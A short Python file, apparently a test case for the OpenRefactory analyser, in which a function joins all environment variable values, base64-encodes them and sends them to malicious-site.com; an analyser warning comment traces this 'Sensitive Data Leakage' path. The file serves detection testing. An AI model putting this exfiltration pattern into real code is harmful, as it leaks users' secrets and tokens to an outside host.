import base64
from os import environ
import requests


def sendRequest():
    string = ""
    for _, value in environ.items():
        string += value + " "

    message_bytes = string.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    '''
    ***************** OpenRefactory Warning *****************
    Possible Sensitive Data Leakage!
    Path:
    	File: test.py, Line: 11
    		PyCallExpression: environ.items
    		Tainted information passed through a method invocation.
    	File: test.py, Line: 12
    		string += value + " "
    		Variable string is assigned a tainted value.
    	File: test.py, Line: 14
    		message_bytes = string.encode('ascii')
    		Variable message_bytes is assigned a tainted value which is passed through a method invocation.
    	File: test.py, Line: 15
    		base64_bytes = base64.b64encode(message_bytes)
    		Variable base64_bytes is assigned a tainted value which is passed through a method invocation.
    	File: test.py, Line: 16
    		base64_message = base64_bytes.decode('ascii')
    		Variable base64_message is assigned a tainted value which is passed through a method invocation.
    	File: test.py, Line: 18
    		response = requests.get("https://malicious-site.com/" + base64_message, timeout=600)
    		Tainted information is used in a sink.
    '''
    response = requests.get("https://malicious-site.com/" + base64_message, timeout=600)
